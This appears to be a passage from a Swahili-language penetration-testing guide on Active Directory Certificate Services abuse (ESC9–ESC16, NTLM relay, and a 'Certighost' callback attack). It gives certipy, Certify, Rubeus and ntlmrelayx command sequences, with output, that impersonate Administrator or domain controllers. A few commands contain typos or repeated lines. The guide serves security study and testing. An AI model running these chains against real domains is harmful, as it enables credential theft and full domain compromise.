#### Matumizi mabaya ya Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya kwa [Certipy](https://github.com/ly4k/Certipy)

Ombi la certificate hufanywa na Certipy kwa chaguo-msingi kwa kutumia template `Machine` au `User`, kulingana na ikiwa jina la akaunti inayofanyiwa relay linaishia na `$`. Kuchagua template mbadala kunawezekana kwa kutumia parameter `-template`.

Technique kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kutumika kulazimisha authentication. Unaposhughulika na domain controllers, ni lazima kuchagua `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) ya **`msPKI-Enrollment-Flag`**, inayorejelewa kama ESC9, huzuia kuingizwa kwa **new `szOID_NTDS_CA_SECURITY_EXT` security extension** kwenye certificate. Flag hii huwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (mpangilio wa default), tofauti na mpangilio wa `2`. Umuhimu wake huongezeka katika hali ambapo certificate mapping dhaifu kwa Kerberos au Schannel inaweza kutumiwa (kama ilivyo katika ESC10), kwa kuwa kutokuwepo kwa ESC9 hakutabadilisha requirements.<sup>[[7]](#references)</sup>

Masharti ambayo setting ya flag hii huwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijawekwa kuwa `2` (default ni `1`), au `CertificateMappingMethods` inajumuisha flag ya `UPN`.
- Certificate imewekewa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya setting ya `msPKI-Enrollment-Flag`.
- EKU yoyote ya client authentication imeainishwa na certificate.
- Ruhusa za `GenericWrite` zinapatikana juu ya account yoyote ili ku-compromise nyingine.

### Abuse Scenario

Tuseme `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, akiwa na lengo la ku-compromise `Administrator@corp.local`. Template ya certificate ya `ESC9`, ambayo `Jane@corp.local` ameruhusiwa ku-enroll, imesanidiwa ikiwa na flag ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya setting yake ya `msPKI-Enrollment-Flag`.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kutokana na `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, huku sehemu ya domain ya `@corp.local` ikiachwa kwa makusudi:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Marekebisho haya hayakiuki vikwazo, kwa kuwa `Administrator@corp.local` bado ni tofauti na `userPrincipalName` ya `Administrator`.

Baada ya hili, certificate template ya `ESC9`, iliyoainishwa kuwa vulnerable, inaombwa kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imebainika kuwa `userPrincipalName` ya certificate inaonyesha `Administrator`, bila “object SID” yoyote.

`userPrincipalName` ya `Jane` kisha inarejeshwa kuwa ya awali, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu authentication kwa kutumia certificate iliyotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumuishwe `-domain <domain>` kwa sababu certificate haina maelezo ya domain:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Mappings Dhaifu za Certificate - ESC10

### Maelezo

Thamani mbili za registry kwenye domain controller zinarejelewa na ESC10:

- Thamani ya default ya `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), awali ikiwa `0x1F`.
- Mpangilio wa default wa `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, awali ukiwa `0`.<sup>[[7]](#references)</sup>

**Kesi ya 1**

Wakati `StrongCertificateBindingEnforcement` imesanidiwa kuwa `0`.

**Kesi ya 2**

Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).

### Kesi ya Abuse 1

Wakati `StrongCertificateBindingEnforcement` imesanidiwa kuwa `0`, account A yenye permissions za `GenericWrite` inaweza kutumiwa kufanya compromise ya account yoyote B.

Kwa mfano, akiwa na permissions za `GenericWrite` juu ya `Jane@corp.local`, attacker analenga kufanya compromise ya `Administrator@corp.local`. Utaratibu huu unaendana na ESC9, hivyo kuruhusu certificate template yoyote kutumiwa.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kwa kutumia vibaya `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Baadaye, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, huku sehemu ya `@corp.local` ikiachwa kimakusudi ili kuepuka ukiukaji wa kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Baada ya hili, cheti kinachowezesha client authentication kinaombwa kama `Jane`, kwa kutumia template chaguomsingi ya `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` kisha inarejeshwa kuwa ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha kwa kutumia certificate iliyopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo ni lazima kubainisha domain kwenye command kwa sababu certificate haina maelezo ya domain.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kesi ya Matumizi Mabaya 2

Kwa `CertificateMappingMethods` iliyo na bit flag ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza ku-compromise akaunti yoyote B isiyo na property ya `userPrincipalName`, ikijumuisha machine accounts na built-in domain administrator `Administrator`.

Hapa, lengo ni ku-compromise `DC$@corp.local`, tukianza kwa kupata hash ya `Jane` kupitia Shadow Credentials na kutumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` huwekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kinaombwa kama `Jane` kwa kutumia template chaguo-msingi ya `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarejeshwa kwenye thamani yake ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kufanya uthibitishaji kupitia Schannel, chaguo la `-ldap-shell` la Certipy linatumika, likionyesha kuwa uthibitishaji umefaulu kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia LDAP shell, amri kama `set_rbcd` huwezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kuhatarisha usalama wa domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Athari hii pia inaenea kwa akaunti yoyote ya mtumiaji isiyo na `userPrincipalName`, au ambapo hailingani na `sAMAccountName`; `Administrator@corp.local` ya kawaida ikiwa shabaha kuu kwa sababu ya LDAP privileges zake za juu na kutokuwa na `userPrincipalName` kwa default.

## Relaying NTLM to ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, mashambulizi ya NTLM relay yanaweza kufanywa bila signing kupitia huduma ya RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Unaweza kutumia `certipy` ku-enumerate ikiwa `Enforce Encryption for Requests` imezimwa, na certipy itaonyesha Vulnerabilities za `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Hali ya Matumizi Mabaya

Inahitaji kusanidi relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Kumbuka: Kwa vidhibiti vya domain, lazima tubainishe `-template` katika DomainController.

Au kwa kutumia [fork ya impacket ya sploutchy](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Maelezo

Administrators wanaweza kusanidi Certificate Authority ili ihifadhiwe kwenye kifaa cha nje kama vile "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye CA server kupitia porti ya USB, au kupitia USB device server iwapo CA server ni virtual machine, authentication key (ambayo wakati mwingine huitwa "password") inahitajika ili Key Storage Provider itengeneze na kutumia keys kwenye YubiHSM.

Key/password hii imehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` ikiwa cleartext.

Reference [hapa](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

Ikiwa private key ya CA imehifadhiwa kwenye kifaa cha USB cha kimwili unapopata shell access, inawezekana kurecover key.

Kwanza, unahitaji kupata CA certificate (hii ni public), kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Hatimaye, tumia amri ya `certutil -sign` kuunda certificate mpya ya kiholela kwa kutumia certificate ya CA na private key yake.

## OID Group Link Abuse - ESC13

### Maelezo

Attribute ya `msPKI-Certificate-Policy` huruhusu policy ya issuance kuongezwa kwenye certificate template. Objects za `msPKI-Enterprise-Oid` zinazohusika na kutoa policies zinaweza kugunduliwa katika Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) ya PKI OID container. Policy inaweza kuunganishwa na AD group kwa kutumia attribute ya object hii ya `msDS-OIDToGroupLink`, hivyo kuwezesha mfumo kumuidhinisha user anayewasilisha certificate kana kwamba ni mwanachama wa group. [Reference hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Kwa maneno mengine, user anapokuwa na ruhusa ya ku-enroll certificate na certificate hiyo imeunganishwa na OID group, user anaweza kurithi privileges za group hiyo.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kupata OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Hali ya Matumizi Mabaya

Tafuta ruhusa ya mtumiaji ambayo inaweza kutumika na `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana ruhusa ya kujiandikisha kwenye `VulnerableTemplate`, mtumiaji anaweza kurithi privileges za kundi la `VulnerableGroup`.

Anachohitaji kufanya ni kubainisha template; atapata certificate yenye haki za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuration Hatarishi ya Upyaishaji wa Certificate- ESC14

### Maelezo

Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini kuna nukuu ya maandishi ya awali.<sup>[[14]](#references)</sup>

ESC14 inahusu vulnerabilities zinazotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au configuration isiyo salama ya attribute ya `altSecurityIdentities` kwenye akaunti za user au computer za Active Directory. Attribute hii yenye thamani nyingi inawaruhusu administrators kuhusisha wenyewe certificates za X.509 na akaunti ya AD kwa madhumuni ya authentication. Inapojazwa, mappings hizi za wazi zinaweza kubatilisha certificate mapping logic ya kawaida, ambayo kwa kawaida hutegemea UPNs au majina ya DNS yaliyo kwenye SAN ya certificate, au SID iliyowekwa kwenye security extension ya `szOID_NTDS_CA_SECURITY_EXT`.

Mapping ya "weak" hutokea wakati string value inayotumika ndani ya attribute ya `altSecurityIdentities` kutambua certificate ni pana sana, ni rahisi kukisiwa, inategemea certificate fields zisizo unique, au inatumia certificate components zinazoweza ku-spoof kwa urahisi. Ikiwa attacker anaweza kupata au kuunda certificate ambayo attributes zake zinalingana na explicit mapping dhaifu iliyofafanuliwa kwa akaunti yenye privileges, anaweza kutumia certificate hiyo ku-authenticate kama akaunti hiyo na kui-impersonate.

Mifano ya `altSecurityIdentities` mapping strings zinazoweza kuwa dhaifu ni pamoja na:

- Ku-map kwa kutumia common Subject Common Name (CN) pekee: kwa mfano, `X509:<S>CN=SomeUser`. Attacker anaweza kupata certificate yenye CN hii kutoka kwenye source isiyo salama zaidi.
- Kutumia Issuer Distinguished Names (DNs) au Subject DNs za jumla kupita kiasi bila qualification zaidi kama serial number maalum au subject key identifier: kwa mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia patterns nyingine zinazotabirika au identifiers zisizo za cryptographic ambazo attacker anaweza kuzitimiza kwenye certificate anachoweza kupata kihalali au ku-forge (ikiwa amesha-compromise CA au amepata template iliyo vulnerable kama katika ESC1).

Attribute ya `altSecurityIdentities` inasaidia formats mbalimbali za mapping, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (hu-map kwa kutumia Issuer na Subject DN kamili)
- `X509:<SKI>SubjectKeyIdentifier` (hu-map kwa kutumia thamani ya Subject Key Identifier extension ya certificate)
- `X509:<SR>SerialNumberBackedByIssuerDN` (hu-map kwa kutumia serial number, ambayo inahitimuwa implicitly na Issuer DN) - hii si standard format, kwa kawaida huwa `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (hu-map kwa kutumia RFC822 name, kwa kawaida email address, kutoka kwenye SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (hu-map kwa kutumia SHA1 hash ya raw public key ya certificate - kwa ujumla ni strong)

Usalama wa mappings hizi unategemea sana specificity, uniqueness, na cryptographic strength ya certificate identifiers zilizochaguliwa na kutumika kwenye mapping string. Hata ikiwa strong certificate binding modes zimewezeshwa kwenye Domain Controllers (ambazo huathiri hasa implicit mappings zinazotegemea SAN UPNs/DNS na SID extension), entry ya `altSecurityIdentities` iliyosanidiwa vibaya bado inaweza kutoa njia ya moja kwa moja ya impersonation ikiwa mapping logic yenyewe ina flaws au inaruhusu sana.
### Scenario ya Abuse

ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa attribute ya `altSecurityIdentities`. Ikiwa attribute hii imewekwa (kwa design au kutokana na misconfiguration), attackers wanaweza ku-impersonate akaunti kwa kuwasilisha certificates zinazolingana na mapping.

#### Scenario A: Attacker Anaweza Kuandika kwenye `altSecurityIdentities`

**Precondition**: Attacker ana write permissions kwenye attribute ya `altSecurityIdentities` ya akaunti lengwa au ana permission ya kumpa akaunti hiyo mojawapo ya permissions zifuatazo kwenye target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Ina Weak Mapping kupitia X509RFC822 (Email)

- **Precondition**: Target ina weak X509RFC822 mapping kwenye altSecurityIdentities. Attacker anaweza kuweka attribute ya mail ya victim ilingane na X509RFC822 name ya target, ku-enroll certificate kama victim, na kuitumia ku-authenticate kama target.
#### Scenario C: Target Ina X509IssuerSubject Mapping

- **Precondition**: Target ina weak X509IssuerSubject explicit mapping kwenye `altSecurityIdentities`.Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ilingane na subject ya X509IssuerSubject mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim, na kutumia certificate hiyo ku-authenticate kama target.
#### Scenario D: Target Ina X509SubjectOnly Mapping

- **Precondition**: Target ina weak X509SubjectOnly explicit mapping kwenye `altSecurityIdentities`. Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ilingane na subject ya X509SubjectOnly mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim, na kutumia certificate hiyo ku-authenticate kama target.
### Shughuli halisi
#### Scenario A

Omba certificate ya certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Hifadhi na ubadilishe cheti
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Thibitisha utambulisho (kwa kutumia certificate)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Usafishaji (hiari)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Kwa mbinu mahususi zaidi za mashambulizi katika hali mbalimbali za mashambulizi, tafadhali rejelea: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Maelezo

Maelezo katika https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Hapa chini kuna nukuu kutoka kwenye maandishi ya awali.<sup>[[15]](#references)</sup>

Kwa kutumia certificate templates za built-in default version 1, mshambulizi anaweza kutengeneza CSR inayojumuisha application policies zinazopendelewa kuliko sifa za Extended Key Usage zilizosanidiwa kwenye template. Sharti pekee ni kuwa na enrollment rights, na inaweza kutumiwa kutengeneza client authentication, certificate request agent, na codesigning certificates kwa kutumia template ya **_WebServer_**

### Abuse

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) ina mifano ya matumizi yenye maelezo zaidi.<sup>[[14]](#references)</sup>


Amri ya `find` ya Certipy inaweza kusaidia kutambua V1 templates ambazo zinaweza kuathiriwa na ESC15 ikiwa CA haijawekewa patch.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation kupitia Schannel

**Hatua ya 1: Omba certificate, ukiingiza Application Policy ya "Client Authentication" na UPN ya target.** Attacker `attacker@corp.local` analenga `administrator@corp.local` kwa kutumia template ya "WebServer" V1 (ambayo inamruhusu enrollee kutoa subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Template ya V1 iliyo hatarini yenye "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inaingiza OID `1.3.6.1.5.5.7.3.2` kwenye extension ya Application Policies ya CSR.
- `-upn 'administrator@corp.local'`: Inaweka UPN kwenye SAN kwa ajili ya impersonation.

**Hatua ya 2: Authenticate kupitia Schannel (LDAPS) kwa kutumia certificate iliyopatikana.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation kupitia Enrollment Agent Abuse

**Hatua ya 1: Omba certificate kutoka kwa V1 template (yenye "Enrollee supplies subject"), ukiingiza Application Policy ya "Certificate Request Agent".** Certificate hii ni ya attacker (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN iliyobainishwa kwa identity ya attacker mwenyewe hapa, kwa kuwa lengo ni kupata uwezo wa agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Huongeza OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia certificate ya "agent" kuomba certificate kwa niaba ya mtumiaji lengwa mwenye mamlaka ya juu.** Hii ni hatua inayofanana na ESC3, ikitumia certificate kutoka Hatua ya 1 kama certificate ya agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Hatua ya 3: Jithibitishe kama mtumiaji mwenye privileji ukitumia certificate ya "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Maelezo

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejelea hali ambapo, ikiwa usanidi wa AD CS haulazimishi kujumuishwa kwa extension ya **szOID_NTDS_CA_SECURITY_EXT** katika certificates zote, mshambulizi anaweza kutumia udhaifu huu kwa:

1. Kuomba certificate **bila SID binding**.

2. Kutumia certificate hii **kwa authentication kama account yoyote**, kwa mfano kujifanya account yenye privilege za juu (k.m., Domain Administrator).

Unaweza pia kurejelea makala hii ili kujifunza zaidi kuhusu kanuni hiyo kwa undani:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Ifuatayo imerejelewa kutoka [kiungo hiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Bofya ili kuona mbinu za matumizi kwa undani zaidi.<sup>[[14]](#references)</sup>

Ili kubaini kama mazingira ya Active Directory Certificate Services (AD CS) yako vulnerable kwa **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Hatua ya 1: Soma UPN ya awali ya akaunti ya mwathiriwa (Hiari - kwa ajili ya urejeshaji).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiriwa iwe `sAMAccountName` ya msimamizi lengwa.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Hatua ya 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Hatua ya 4: Omba certificate kama mtumiaji "victim" kutoka _kwenye template yoyote inayofaa ya client authentication_ (kwa mfano, "User") kwenye CA iliyo katika hatari ya ESC16.** Kwa sababu CA iko katika hatari ya ESC16, itaacha kiotomatiki SID security extension kwenye certificate iliyotolewa, bila kujali mipangilio mahususi ya template kwa extension hii. Weka environment variable ya Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Kisha omba cheti:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Hatua ya 5: Rejesha UPN ya akaunti ya "mwathiriwa".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Hatua ya 6: Authenticate kama administrator anayelengwa.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Maelezo

**Certighost** hutumia vibaya **AD CS enrollment chase / callback path** ambapo CA huamini request attributes zinazotolewa na requester ili kutambua identity inayopaswa kuwekwa kwenye certificate iliyotolewa. Katika public PoC, request iliyoundwa mahsusi huwa na:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP inayodhibitiwa na attacker ambayo CA itawasiliana nayo
- **`rmd`**: **jina la DNS la target Domain Controller** la kuiga

Ikiwa CA itafuata chase hiyo, itaunganisha kwa attacker kupitia **SMB/LSA (`445`)** na **LDAP (`389`)**. Attacker hutumia **machine account halisi** (kwa kawaida iliyoundwa kupitia **`ms-DS-MachineAccountQuota`** ya kawaida) ili callback session ithibitishe kama domain principal halali, lakini rogue services hurudisha identity attributes za **target DC** badala yake:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ikiwa CA **haihusishi cryptographically identity iliyorejeshwa na callback principal iliyothibitishwa**, inaweza kutoa certificate ya **Domain Controller** ingawa session ilithibitishwa kama machine account inayodhibitiwa na attacker. Hii inafanya bug hii kuwa tofauti kimawazo na **Certifried**: badala ya kuandika upya AD attributes kama `dNSHostName`, attacker **hubadilisha identity data wakati wa CA callback resolution**.<sup>[[2]](#references)</sup>

**Masharti muhimu:**

- **domain credentials** zenye privileges ndogo
- Uwezo wa **kuunda au kutumia tena computer account**
- Network reachability kutoka kwa **CA** kwenda kwenye **ports `389` na `445`** zinazodhibitiwa na attacker
- CA request path iliyo hatarini / ambayo haijapatchiwa (update ya Microsoft ya **July 14, 2026** iliongeza **DC validation kwa `cdc`** pamoja na **resolved-SID comparison**)

**`.pfx`** inayopatikana inaweza kutumika kwa **PKINIT**, na kutoa **`.ccache`** pamoja na, katika mtiririko wa published PoC, **target DC NT hash**, ambayo kwa kawaida inatosha kusababisha **full domain compromise**.

### Unyonyaji

Public PoC huautomate chain nzima:<sup>[[1]](#references)</sup>

1. Unda au tumia tena **machine account** inayodhibitiwa na attacker.
2. Anzisha **rogue LDAP na SMB/LSA listeners** kwenye `389` na `445`.
3. Tuma certificate request iliyo na attributes **`cdc`** inayodhibitiwa na attacker na **`rmd`** ya target.
4. Ruhusu CA ithibitishe kwa rogue listeners kama machine account inayodhibitiwa, lakini ijibu identity lookups kwa attributes za **target DC**.
5. Pokea **DC certificate** iliyosainiwa na CA, kisha uitumie kwa **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Useful runtime flags kutoka kwa PoC:

- `--listener <ip>`: chagua wazi IP ya callback inayotangazwa katika `cdc`
- `--computer-name <NAME$>`: tumia tena machine account iliyopo badala ya kuunda mpya

**Operational notes:**

- PoC inahitaji **root** kwa sababu inafunga **privileged ports** `389` na `445`.
